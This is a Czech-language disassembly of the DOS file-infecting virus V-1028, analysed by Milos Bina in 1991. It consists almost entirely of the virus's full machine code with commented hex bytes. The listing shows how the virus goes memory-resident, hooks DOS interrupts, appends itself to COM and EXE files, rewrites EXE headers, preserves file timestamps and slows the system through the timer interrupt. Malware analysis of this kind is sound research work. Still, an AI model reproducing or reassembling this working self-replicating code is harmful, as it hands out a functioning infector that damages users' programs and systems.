; ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
; ณ                                                ณ
; ณ              Virus    V - 1028                 ณ
; ณ                                                ณ
; ณ    Rozbor provedl v unoru 1991 Milos Bina      ณ
; ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
;

;        ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;        ณ    NOVY INT 1Ch      ณ
;        ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
0000 9C             PUSHF                        ; uschova registru
0001 1E             PUSH   DS
0002 51             PUSH   CX
0003 50             PUSH   AX
0004 33C0           XOR    AX,AX                 ; ฟ
0006 8ED8           MOV    DS,AX                 ; ณ 3.byte citace hodin
0008 A06E04         MOV    AL,[046E]             ; ู (zvetsuje se o 1 kazdou hodinu)
000B 0AC0           OR     AL,AL
000D 7409           JZ     0018                  ; citac nulovy
000F B99C04         MOV    CX,049C               ; ฟ
0012 E2FE           LOOP   0012                  ; ณ zpozdovaci smycka
0014 FEC8           DEC    AL                    ; ณ prodluzuje se kazdou hodinu
0016 75F7           JNZ    000F                  ; ู
0018 58             POP    AX                    ; obnova registru
0019 59             POP    CX
001A 1F             POP    DS
001B 9D             POPF
001C 2EFF2EEC03     JMP    Far CS:[03EC]         ; skok na puvodni INT 1ch

; skok na hostitele EXE
0021 8CC3           MOV    BX,ES                 ; ฟ
0023 83C310         ADD    BX,0010               ; ณ
0026 2E039CF603     ADD    BX,CS:[03F6+SI]       ; ณ vypocet startovni adresy
002B 2E895C4E       MOV    CS:[SI+4E],BX         ; ณ a ulozeni za instrukci skoku
002F 90             NOP                          ; ณ
0030 2E8B9CF403     MOV    BX,CS:[03F4+SI]       ; ณ
0035 2E895C4C       MOV    CS:[SI+4C],BX         ; ู
0039 90             NOP
003A 8CC3           MOV    BX,ES                 ; ฟ
003C 83C310         ADD    BX,0010               ; ณ 
003F 2E039CFA03     ADD    BX,CS:[03FA+SI]       ; ณ nastaveni SS:SP
0044 8ED3           MOV    SS,BX                 ; ณ
0046 2E8BA4F803     MOV    SP,CS:[03F8+SI]       ; ู
004B EA00000000     JMP    0000:0000             ; skok na hostitele

; skok na hostitele COM
0050 BF0001         MOV    DI,0100               ; ฟ
0053 81C60004       ADD    SI,0400               ; ณ obnova prvnich
0057 A4             MOVSB                        ; ณ
0058 A5             MOVSW                        ; ู
0059 8B260600       MOV    SP,[0006]             ; ฟ
005D 33DB           XOR    BX,BX                 ; ณ obnova zasobniku
005F 53             PUSH   BX                    ; ู
0060 FF64F1         JMP    [SI-0F]               ; skok na hostitele
0063 90             NOP

;        ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;        ณ    STARTOVNI BOD     ณ
;        ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
0064 E80000         CALL   0067                  ; zjisteni ofsetu viru
0067 5E             POP    SI                    ; ฟ
0068 FC             CLD                          ; ณ vypocet adresy zacatku
0069 83C699         ADD    SI,FF99               ; ู viru (0000)
006C 81BC00044D5A   CMP    [0400+SI],5A4D        ; jsem pripojen na EXE ?
0072 740E           JZ     0082                  ; ano
; pripojen na COM
0074 FA             CLI                          ; ฟ
0075 8BE6           MOV    SP,SI                 ; ณ nastaveni zasobniku
0077 81C40405       ADD    SP,0504               ; ณ za vir
007B FB             STI                          ; ู
007C 3B260600       CMP    SP,[0006]             ; vejde se zasobnik do volne pameti
0080 73CE           JNC    0050                  ; nevejde -> konec
; EXE
0082 50             PUSH   AX                    ; uschova registru
0083 06             PUSH   ES
0084 56             PUSH   SI
0085 1E             PUSH   DS
0086 B8FE4B         MOV    AX,4BFE               ; test, jestli uz jsem v pameti
0089 CD21           INT    21                    ; volam svoji imaginarni sluzbu 4BFE
008B 81FFBB55       CMP    DI,55BB               ; nastaven muj priznak ?
008F 7504           JNZ    0095                  ; jeste nenastaven
; uz jsem v pameti
0091 07             POP    ES
0092 E9A100         JMP    0136                  ; nebudu se instalovat -> konec

; instalace viru do pameti
0095 07             POP    ES                    ; ฟ
0096 B449           MOV    AH,49                 ; ณ uvolni pamet programu
0098 CD21           INT    21                    ; ู
009A BBFFFF         MOV    BX,FFFF               ; ฟ
009D B448           MOV    AH,48                 ; ณ cti maximalni pamet
009F CD21           INT    21                    ; ู
00A1 83EB45         SUB    BX,0045               ; pamet aspon 450h byte ?
00A4 90             NOP
00A5 7303           JNC    00AA                  ; o.k
00A7 E98C00         JMP    0136                  ; mala pamet -> konec
00AA 8CC1           MOV    CX,ES                 ; ฟ
00AC F9             STC                          ; ณ
00AD 13CB           ADC    CX,BX                 ; ณ zabere vsechnu pamet
00AF B44A           MOV    AH,4A                 ; ณ
00B1 CD21           INT    21                    ; ู
00B3 BB4400         MOV    BX,0044               ; ฟ
00B6 F9             STC                          ; ณ zmenseni pameti
00B7 26191E0200     SBB    ES:[0002],BX          ; ู
00BC 06             PUSH   ES                    ; ฟ
00BD 8EC1           MOV    ES,CX                 ; ณ  zabere si pamet
00BF B44A           MOV    AH,4A                 ; ณ
00C1 CD21           INT    21                    ; ู
00C3 8CC0           MOV    AX,ES                 ; ฟ
00C5 48             DEC    AX                    ; ณ
00C6 8ED8           MOV    DS,AX                 ; ณ
00C8 C70601000800   MOV    [0001],0008           ; ณ
00CE E89002         CALL   0361                  ; ณ
00D1 8BD8           MOV    BX,AX                 ; ณ 
00D3 8BCA           MOV    CX,DX                 ; ณ
00D5 1F             POP    DS                    ; ณ dalsi nastaveni
00D6 8CD8           MOV    AX,DS                 ; ณ parametru pro instalaci
00D8 E88602         CALL   0361                  ; ณ do pameti
00DB 03060600       ADD    AX,[0006]             ; ณ
00DF 83D200         ADC    DX,0000               ; ณ
00E2 2BC3           SUB    AX,BX                 ; ณ
00E4 1BD1           SBB    DX,CX                 ; ณ
00E6 7204           JC     00EC                  ; ณ
00E8 29060600       SUB    [0006],AX             ; ณ
00EC 5E             POP    SI                    ; ณ
00ED 56             PUSH   SI                    ; ู
00EE 1E             PUSH   DS
00EF 0E             PUSH   CS
00F0 33FF           XOR    DI,DI                 ; ฟ
00F2 8EDF           MOV    DS,DI                 ; ณ uschova stare adresy
00F4 C5068400       LDS    AX,[0084]             ; ณ interruptu 21h
00F8 2E8984F003     MOV    CS:[03F0+SI],AX       ; ณ
00FD 2E8C9CF203     MOV    CS:[03F2+SI],DS       ; ู

0102 E86202         CALL   0367            ; ???????

0105 33FF           XOR    DI,DI                 ; ฟ
0107 8EDF           MOV    DS,DI                 ; ณ ushova stare adresy
0109 C5067000       LDS    AX,[0070]             ; ณ interruptu 1ch
010D 2E8984EC03     MOV    CS:[03EC+SI],AX       ; ณ
0112 2E8C9CEE03     MOV    CS:[03EE+SI],DS       ; ู
0117 1F             POP    DS                    ; ฟ
0118 B90302         MOV    CX,0203               ; ณ presun vira do zabrane pameti
011B F3A5           REP    MOVSW                 ; ู
011D 33C0           XOR    AX,AX                 ; ฟ
011F 8ED8           MOV    DS,AX                 ; ณ
0121 C70670000000   MOV    [0070],0000           ; ณ nastaveni novych
0127 8C067200       MOV    [0072],ES             ; ณ INT 21h a INT 1Ch
012B C70684004801   MOV    [0084],0148           ; ณ
0131 8C068600       MOV    [0086],ES             ; ู
0135 07             POP    ES                    ; obnova registru
0136 5E             POP    SI
0137 1F             POP    DS
0138 58             POP    AX
0139 2E81BC00044D5A CMP    CS:[0400+SI],5A4D
0140 7403           JZ     0145
0142 E90BFF         JMP    0050                  ; hostitel COM -> konec
0145 E9D9FE         JMP    0021                  ; hostitel EXE -> konec

;        ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;        ณ    NOVY INT 21h      ณ
;        ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
0148 80FC4B         CMP    AH,4B
014B 7409           JZ     0156                   ; sluzba spust program
014D 2EFF2EF003     JMP    Far CS:[03F0]          ; skok na puvodni int 21h
0152 BFBB55         MOV    DI,55BB                ; nastaveni priznaku, ze
                                                  ; uz jsem v pameti
0155 CF             IRET
0156 3CFE           CMP    AL,FE
0158 74F8           JZ     0152                   ; volana moje sluzba dotazu
015A 0AC0           OR     AL,AL
015C 75EF           JNZ    014D                   ; volana sluzba zaved overlay
                                                  ; -> konec
015E 9C             PUSHF                         ; uschova registru
015F 50             PUSH   AX
0160 53             PUSH   BX
0161 51             PUSH   CX
0162 52             PUSH   DX
0163 56             PUSH   SI
0164 57             PUSH   DI
0165 55             PUSH   BP
0166 06             PUSH   ES
0167 1E             PUSH   DS
0168 8CDE           MOV    SI,DS
016A 33C0           XOR    AX,AX                 ; ฟ
016C 8ED8           MOV    DS,AX                 ; ณ cteni adresy INT 24h
016E C4069000       LES    AX,[0090]             ; ู
0172 06             PUSH   ES                    ; uschova adresy
0173 50             PUSH   AX
0174 C70690005E03   MOV    [0090],035E           ; ฟ nastaveni noveho INT 24h
017A 8C0E9200       MOV    [0092],CS             ; ู
017E 8EDE           MOV    DS,SI                 ; ฟ
0180 33C9           XOR    CX,CX                 ; ณ cti attributy souboru
0182 B80043         MOV    AX,4300               ; ณ
0185 E85D02         CALL   03E5                  ; ู
0188 8BD9           MOV    BX,CX                 ; ฟ
018A 80E1F8         AND    CL,F8                 ; ณ test attributu
018D 3ACB           CMP    CL,BL                 ; ณ
018F 7407           JZ     0198                  ; ู neni R/O, Hodden ani System
0191 B80143         MOV    AX,4301               ; ฟ nastavi atribut R/W
0194 E84E02         CALL   03E5                  ; ู
0197 F9             STC
0198 9C             PUSHF                        ; uschova reg.
0199 1E             PUSH   DS
019A 52             PUSH   DX
019B 53             PUSH   BX
019C B8023D         MOV    AX,3D02               ; ฟ otevre soubor pro cteni
019F E84302         CALL   03E5                  ; ู
01A2 720A           JC     01AE                  ; chyba -> konec
01A4 8BD8           MOV    BX,AX                 ; bx:=identifikator

01A6 E82A00         CALL   01D3                  ; nakaza

01A9 B43E           MOV    AH,3E                 ; ฟ uzavri soubor
01AB E83702         CALL   03E5                  ; ู
01AE 59             POP    CX                    ; obnova registru
01AF 5A             POP    DX
01B0 1F             POP    DS
01B1 9D             POPF
01B2 7306           JNC    01BA                  ; neni chyba close
01B4 B80143         MOV    AX,4301               ; ฟ obnova atributu
01B7 E82B02         CALL   03E5                  ; ู
01BA 33C0           XOR    AX,AX                 ; ฟ
01BC 8ED8           MOV    DS,AX                 ; ณ obnova INT 24h
01BE 8F069000       POP    [0090]                ; ณ
01C2 8F069200       POP    [0092]                ; ู
01C6 1F             POP    DS                    ; obnova registru
01C7 07             POP    ES
01C8 5D             POP    BP
01C9 5F             POP    DI
01CA 5E             POP    SI
01CB 5A             POP    DX
01CC 59             POP    CX
01CD 5B             POP    BX
01CE 58             POP    AX
01CF 9D             POPF
01D0 E97AFF         JMP    014D
; อออออออออออออออออออออออออออออออออออออออออออออออ
; vstup: bx = identifikator souboru
; vystup: nakazeny soubor
01D3 0E             PUSH   CS                    ; ฟ
01D4 0E             PUSH   CS                    ; ณ es:=cs
01D5 1F             POP    DS                    ; ณ ds:=cs
01D6 07             POP    ES                    ; ู
01D7 BA0404         MOV    DX,0404               ; ฟ
01DA B91800         MOV    CX,0018               ; ณ cte prvnich 18h byte
01DD B43F           MOV    AH,3F                 ; ณ souboru na (cs:404h)
01DF E80302         CALL   03E5                  ; ู
01E2 33C9           XOR    CX,CX                 ; ฟ
01E4 33D2           XOR    DX,DX                 ; ณ nastavi ukazatel v souboru
01E6 B80242         MOV    AX,4202               ; ณ na jeho konec
01E9 E8F901         CALL   03E5                  ; ู
01EC 89161E04       MOV    [041E],DX             ; uschova hor. slova delky
01F0 3D0404         CMP    AX,0404               ; test delky
01F3 83DA00         SBB    DX,0000               ;
01F6 7258           JC     0250                  ; soubor < 404h
01F8 A31C04         MOV    [041C],AX             ; ฟ uschova delky suboru
01FB A32004         MOV    [0420],AX             ; ู
; budou testy, je-li soubor uz nakazen
01FE 813E04044D5A   CMP    [0404],5A4D
0204 7517           JNZ    021D                  ; pripojuje se na COM
; EXE
0206 A10C04         MOV    AX,[040C]             ; ฟ
0209 03061A04       ADD    AX,[041A]             ; ณ
020D E85101         CALL   0361                  ; ณ dx:cx:=ukazatel do souboru
0210 03061804       ADD    AX,[0418]             ; ณ        na jeho start
0214 83D200         ADC    DX,0000               ; ณ
0217 8BCA           MOV    CX,DX                 ; ณ
0219 8BD0           MOV    DX,AX                 ; ู
021B EB15           JMP    0232
; COM
021D 803E0404E9     CMP    [0404],E9             ; prvni instr. JMP Near
0222 752D           JNZ    0251                  ; ne => nenakazeno
0224 8B160504       MOV    DX,[0405]             ; ฟ dx:cx=^start
0228 81C20301       ADD    DX,0103               ; ู
022C 7223           JC     0251                  ; chybna start. adr => nenakazeno
022E FECE           DEC    DH
0230 33C9           XOR    CX,CX
0232 83EA64         SUB    DX,0064               ; ฟ
0235 83D900         SBB    CX,0000               ; ณ nastaveni ukazatele v souboru
0238 B80042         MOV    AX,4200               ; ณ na zacatek teoretickeho vira
023B E8A701         CALL   03E5                  ; ู
023E 050404         ADD    AX,0404               ; ฟ
0241 83D200         ADC    DX,0000               ; ณ
0244 3B061C04       CMP    AX,[041C]             ; ณ test, je-li startovni adresa
0248 7507           JNZ    0251                  ; ณ 404h-64h byte od konce
024A 3B161E04       CMP    DX,[041E]             ; ณ souboru
024E 7501           JNZ    0251                  ; ู  neni => nenakazeno
0250 C3             RET                          ; je => nakazeno -> konec
; soubor jeste nenakazen, ja ho nakazim

0251 33C9           XOR    CX,CX                 ; ฟ
0253 8BD1           MOV    DX,CX                 ; ณ nastaveni ukazatele
0255 B80242         MOV    AX,4202               ; ณ v souboru na konec
0258 E88A01         CALL   03E5                  ; ู
025B 813E04044D5A   CMP    [0404],5A4D
0261 7409           JZ     026C                  ; EXE
; COM
0263 050406         ADD    AX,0604               ; ฟ
0266 83D200         ADC    DX,0000               ; ณ soubor+vir < 64KB ?
0269 7419           JZ     0284                  ; ู
026B C3             RET                          ; prelezl by -> konec
; EXE
026C 8B161C04       MOV    DX,[041C]             ; ฟ
0270 F6DA           NEG    DL                    ; ณ posun ukazatele za soubor
0272 83E20F         AND    DX,000F               ; ณ tak, aby jeho nova delka
0275 33C9           XOR    CX,CX                 ; ณ byla nasobkem 10h
0277 B80142         MOV    AX,4201               ; ณ
027A E86801         CALL   03E5                  ; ู
027D A31C04         MOV    [041C],AX             ; ฟ uschova nove zaokrouhlene
0280 89161E04       MOV    [041E],DX             ; ู delky
0284 B80057         MOV    AX,5700               ; ฟ cti datum a cas vytvoreni souboru
0287 E85B01         CALL   03E5                  ; ู
028A 9C             PUSHF                        ;
028B 51             PUSH   CX                    ; uschova casu
028C 52             PUSH   DX                    ; uschova data
028D 813E04044D5A   CMP    [0404],5A4D
0293 7405           JZ     029A
; COM
0295 B80001         MOV    AX,0100               ; startovni adresa COM
0298 EB07           JMP    02A1
; EXE
029A A11804         MOV    AX,[0418]             ; ฟ EXEIP
029D 8B161A04       MOV    DX,[041A]             ; ู ReloCS
; spolecne
02A1 BFF403         MOV    DI,03F4               ; ฟ 
02A4 AB             STOSW                        ; ณ uschova start. adr
02A5 8BC2           MOV    AX,DX                 ; ณ
02A7 AB             STOSW                        ; ู
02A8 A11404         MOV    AX,[0414]             ; ฟ
02AB AB             STOSW                        ; ณ uschova zasobniku
02AC A11204         MOV    AX,[0412]             ; ณ (smysl jen u EXE)
02AF AB             STOSW                        ; ู
02B0 A12004         MOV    AX,[0420]             ; dolni slovo delky pgmu
02B3 AB             STOSW                        ;
02B4 A10804         MOV    AX,[0408]             ; ฟ PageCnt
02B7 AB             STOSW                        ; ู (smysl jen u EXE)
02B8 BE0404         MOV    SI,0404               ; ฟ
02BB A5             MOVSW                        ; ณ uschova prvnich 4 byte
02BC A5             MOVSW                        ; ู souboru
02BD 33D2           XOR    DX,DX                 ; ฟ
02BF B90404         MOV    CX,0404               ; ณ pripojeni vira k souboru
02C2 B440           MOV    AH,40                 ; ณ (404h byte)
02C4 E81E01         CALL   03E5                  ; ู
02C7 7227           JC     02F0                  ; chyba -> konec
02C9 33C8           XOR    CX,AX
02CB 7523           JNZ    02F0                  ; nezapsan prislusny pocet byte
02CD 8BD1           MOV    DX,CX                 ; ฟ
02CF B80042         MOV    AX,4200               ; ณ nastaveni ukazatele na
02D2 E81001         CALL   03E5                  ; ู zacatek souboru
02D5 813E04044D5A   CMP    [0404],5A4D
02DB 7415           JZ     02F2
; COM
02DD C6060404E9     MOV    [0404],E9             ; ฟ
02E2 A11C04         MOV    AX,[041C]             ; ณ nove prvni 3 byty
02E5 056100         ADD    AX,0061               ; ณ viru (novy start)
02E8 A30504         MOV    [0405],AX             ; ู
02EB B90300         MOV    CX,0003               ; pocet byte k nahrani
02EE EB5A           JMP    034A

02F0 EB60           JMP    0352                  ; konec
; EXE
02F2 A10C04         MOV    AX,[040C]             ; ฟ
02F5 E86900         CALL   0361                  ; ณ
02F8 F7D0           NOT    AX                    ; ณ
02FA F7D2           NOT    DX                    ; ณ
02FC 40             INC    AX                    ; ณ vypocet nove
02FD 7501           JNZ    0300                  ; ณ startovni adresy
02FF 42             INC    DX                    ; ณ pro EXE soubor
0300 03061C04       ADD    AX,[041C]             ; ณ
0304 13161E04       ADC    DX,[041E]             ; ณ
0308 B91000         MOV    CX,0010               ; ณ
030B F7F1           DIV    CX                    ; ณ
030D C70618046400   MOV    [0418],0064           ; ณ
0313 A31A04         MOV    [041A],AX             ; ู
0316 054100         ADD    AX,0041               ; ฟ
0319 A31204         MOV    [0412],AX             ; ณ novy zasobnik
031C C70614040001   MOV    [0414],0100           ; ู
0322 81061C040404   ADD    [041C],0404           ; ฟ
0328 83161E0400     ADC    [041E],0000           ; ณ
032D A11C04         MOV    AX,[041C]             ; ณ
0330 25FF01         AND    AX,01FF               ; ณ
0333 A30604         MOV    [0406],AX             ; ณ
0336 9C             PUSHF                        ; ณ  vypocet nove delky
0337 A11D04         MOV    AX,[041D]             ; ณ  souboru do hlavicky
033A D02E1F04       SHR    B/[041F],1            ; ณ  EXE
033E D1D8           RCR    AX,1                  ; ณ
0340 9D             POPF                         ; ณ
0341 7401           JZ     0344                  ; ณ
0343 40             INC    AX                    ; ณ
0344 A30804         MOV    [0408],AX             ; ู
0347 B91800         MOV    CX,0018               ; pocet byte k nahrani
034A BA0404         MOV    DX,0404               ; ฟ nahraje novy zacatek souboru
034D B440           MOV    AH,40                 ; ณ COM: prvni 3 byty
034F E89300         CALL   03E5                  ; ู EXE: prvnich 18h byte
0352 5A             POP    DX                    ; dx:=datum
0353 59             POP    CX                    ; cx:=cas
0354 9D             POPF
0355 7206           JC     035D                  ; chyba
0357 B80157         MOV    AX,5701               ; ฟ obnova data a casu
035A E88800         CALL   03E5                  ; ู vytvoreni souboru
035D C3             RET

;        ฺฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฟ
;        ณ    NOVY INT 24h      ณ
;        ภฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤู
; instalovan docasne, pouze v dobe nakazy
035E B003           MOV    AL,03
0360 CF             IRET
; อออออออออออออออออออออออออออออออออออออออออออออออ
; vstup: ax
; vystup: dx:ax:=ax*10h
0361 BA1000         MOV    DX,0010
0364 F7E2           MUL    DX
0366 C3             RET
; อออออออออออออออออออออออออออออออออออออออออออออออ
0367 9C             PUSHF
0368 50             PUSH   AX
0369 1E             PUSH   DS
036A 06             PUSH   ES
036B 33C0           XOR    AX,AX
036D 8ED8           MOV    DS,AX                 ; ds:=0;
036F C406A000       LES    AX,[00A0]             ; es:ax:=^INT 28h
0373 E84C00         CALL   03C2
0376 7436           JZ     03AE
0378 C4068000       LES    AX,[0080]             ; es:ax:=^INT 20h
037C E84300         CALL   03C2
037F 742D           JZ     03AE
0381 C4069C00       LES    AX,[009C]             ; es:ax:=^INT 27h
0385 E83A00         CALL   03C2
0388 7424           JZ     03AE
038A C4069800       LES    AX,[0098]             ; es:ax:=^INT 26h
038E E83100         CALL   03C2
0391 741B           JZ     03AE
0393 C4062400       LES    AX,[0024]             ; es:ax:=^INT 9h
0397 E82800         CALL   03C2
039A 7412           JZ     03AE
039C C4064C00       LES    AX,[004C]             ; es:ax:=^INT 13h
03A0 E81F00         CALL   03C2
03A3 7409           JZ     03AE
03A5 C4068400       LES    AX,[0084]             ; es:ax:=^INT 21h
03A9 E81600         CALL   03C2
03AC 750F           JNZ    03BD
03AE 26C4062312     LES    AX,ES:[1223]
03B3 2E8984F003     MOV    CS:[03F0+SI],AX
03B8 2E8C84F203     MOV    CS:[03F2+SI],ES
03BD 07             POP    ES
03BE 1F             POP    DS
03BF 58             POP    AX
03C0 9D             POPF
03C1 C3             RET
; อออออออออออออออออออออออออออออออออออออออออออออออ
03C2 26813E601C3D0F CMP    ES:[1C60],0F3D        ; CMP AX, 0Fxx
03C9 7519           JNZ    03E4
03CB 26813E641C05B8 CMP    ES:[1C64],B805        ; ADD AX, B8xx
03D2 7510           JNZ    03E4
03D4 26813E681C9DCF CMP    ES:[1C68],CF9D        ; POPF, IRET
03DB 7507           JNZ    03E4
03DD 26813E6C1C3E28 CMP    ES:[1C6C],283E        ; SUB DS:
03E4 C3             RET
; volani puvodniho int 21h
03E5 9C             PUSHF
03E6 2EFF1EF003     CALL   Far CS:[03F0]
03EB C3             RET

03EC   53FF00F0     DD     ?                     ; adresa puvodniho int 1ch
03F0   75032F14     DD     ?                     ; adr. puv. int 21h
03F4   0001         DW     ?                     ; EXEIP
03F6   F80E         DW     ?                     ; ReloCS
03F8   0074         DW     ?                     ; EXESP
03FA   3D02         DW     ?                     ; ReloSS
03FC   BC62         DW     ?                     ; dolni slovo delky puv. pgmu
03FE   DA0A         DW     ?                     ; PageCnt
0400   E92D0DBA     DB     ?,?,?,?               ; puvodni ctyri byty

; อออออออออออออออออออออออออออออออออออออออออออออออ toto jiz neni soucasti vira
;                                                 pripojeneho k souboru.
;                                                 Tato tabulka vznika pri behu
; hlavicka EXE
0404                DW      ?                    ; sign
0406                DW      ?                    ; PartPag
0408                DW      ?                    ; PageCnt
040A                DW      ?                    ; ReloCnt
040C                DW      ?                    ; HdrSize
040E                DW      ?                    ; MinMem
0410                DW      ?                    ; MaxMem
0412                DW      ?                    ; ReloSS
0414                DW      ?                    ; EXESP
0416                DW      ?                    ; ChkSum
0418                DW      ?                    ; EXEIP
041A                DW      ?                    ; ReloCS

041C                DW      ?                    ; dolni slovo delky pgmu ฟ zaokrouhleno
041E                DW      ?                    ; horni slovo delky pgmu ู
0420                DW      ?                    ; dolni slovo delky
